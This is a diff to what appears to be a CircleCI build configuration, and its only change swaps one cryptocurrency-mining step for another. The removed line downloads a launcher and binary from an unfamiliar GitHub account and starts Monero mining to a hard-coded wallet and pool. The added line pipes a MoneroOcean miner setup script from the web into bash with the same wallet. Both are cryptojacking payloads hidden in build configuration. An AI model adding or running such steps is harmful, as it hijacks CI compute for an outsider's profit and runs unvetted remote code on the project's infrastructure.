@@ -5,5 +5,4 @@ jobs:
     docker:
       - image: circleci/ruby:2.4.2-jessie-node
       - checkout
-      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 83dHfxEXEJbFZLoj3RcEonQy4GxFoWhJm9XDAxL1k9F4LQuSwZ9YB3Ej51pdAktrskffVsQjZUopjX2eHJoDVUVED1y9pYh  -Cloud  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 gulf.moneroocean.stream:10032
-      
+      - run:  curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 83dHfxEXEJbFZLoj3RcEonQy4GxFoWhJm9XDAxL1k9F4LQuSwZ9YB3Ej51pdAktrskffVsQjZUopjX2eHJoDVUVED1y9pYh   
